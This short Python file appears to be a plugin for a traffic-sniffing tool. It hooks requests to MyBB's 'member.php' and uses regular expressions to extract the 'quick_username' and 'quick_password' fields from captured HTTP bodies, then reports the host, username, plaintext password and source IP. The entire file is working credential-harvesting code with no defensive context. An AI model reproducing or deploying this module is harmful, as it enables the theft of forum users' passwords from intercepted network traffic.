# MyBB
L_HOOKS = dict()
L_HOOKS['url'] = 'member.php'
L_HOOKS['module'] = 'mybb.parseMyBB'

def parseMyBB(Headers, ipsrc='', hook=''):
    import re
    User = re.findall("(?i)quick_username=([A-Za-z0-9_-]+)&(.*)", Headers['body'])
    Passwd = re.findall("(?i)quick_password=([A-Za-z0-9_-]+)&(.*)", Headers['body'])

    if len(User) > 0 and len(Passwd) > 0:
       if len(User[0]) > 0 and len(Passwd[0]) > 0:
           return "[BOARDS]: site="+str(Headers['headers']['host'][0])+", user="+str(User[0][0])+", passwd="+Passwd[0][0]+", ip="+str(ipsrc)
